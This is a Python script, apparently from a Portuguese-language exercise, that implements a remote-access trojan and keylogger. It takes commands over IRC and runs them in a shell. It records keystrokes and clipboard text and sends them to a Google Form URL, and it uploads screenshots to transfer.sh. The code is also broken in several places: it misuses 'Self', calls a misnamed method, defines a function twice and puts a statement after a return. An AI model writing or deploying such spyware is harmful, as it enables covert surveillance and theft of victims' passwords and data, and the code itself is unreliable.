import cmd
from distutils import errors
from fileinput import filename
from nis import match
import socket
from typing_extensions import Self
import re
from subprocess import run, PIPE, STDOUT
import keyboard
from requests import post
from pyperclip import paste
from pyscreenshot import grab_to_file
from os import remove




class ConexaoAtacante:
    def parse_msg(self, msg):
        match = re.match(':(.*)!.*@.*(?:\..*)* PRIVMSG {}:(.*)\r\n'.format(self.nick), msg)
        return match
    
    
    def __init__(self, endereco_irc, nick):
        Self.socket = socket.socket()
        self.socket.connect(endereco_irc)
        self.registra_usuario(nick)
        
    def envia_comando(self, cmd):
        cmd += '\r\n'
        self.socket.send(cmd.encode('utf8'))
        
        
    def receber_comando(self):
        msg = self.socket.recv(4096).decode('utf8', errors='ignore')
        self.responde_ping(msg)
        msg_match = self.parse_msg(msg)
        if msg_match:
            return msg_match.groups()
        return None, None
    
    def registra_usuario(self, nick):
        self.envia_comando('NICK' + nick)
        self.envia_comando('USER {0} {0} {0} :{0}'.format(nick))
    
    def responde_ping(self, msg):
        match = re.match('PING:(.*)', msg)
        if match:
            pong = match.group(1)
            self.envia_comando('PONG:' +pong)
        
        
conexao = ConexaoAtacante(('irc.pythonbrasil.net', 6667))
while True:
    cmd = conexao.recebe_comando()
    
    def roda_comando_no_shell(cmd):
        processo_completo = run(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
        resposta = processo_completo.stdout.decode('cp1252', errors='ignore')
        return resposta
        
        
teclas_apertadas = []
teclas_especiais = {'space':' ','enter':'\n'}

# Keyboard.on_press(lambda k:teclas_apertadas.append(k.name))
# what is so invisible code?

def trata_tecla(k):
    if'shift' in k.modifiers:
        tecla = k.nome
        if len(tecla) > 1:
            tecla = teclas_especiais.get(tecla, '<<{}>>'.format(tecla))
        teclas_apertadas.append(tecla)
        
keyboard.on_press(trata_tecla)

url_form = ()

def trata_tecla(k):
    if len(teclas_apertadas) >= 100:
        texto_digitado = ''.join(teclas_apertadas)
        teclas_apertadas.clear()
        post(url_form, {'entry.1269107664':texto_digitado })
        
def trata_copypaste():
    texto_copiado = paste()
    teclas_apertadas.extend(list(texto_copiado))
    
keyboard.add_hotkey('ctrl+c', trata_copypaste)

def tirar_screenshot(filename):
    grab_to_file(filename, ChildProcess=False)
    with open(filename, 'rb') as f:
        r = post('https://transfer.sh', files={filename: f})
    resposta = r.text if r.status_code == 200 else'Error no upload'
    return resposta
    remove(filename)
    
comandos = {'!shell':roda_comando_no_shell,'!screenshot':tirar_screenshot}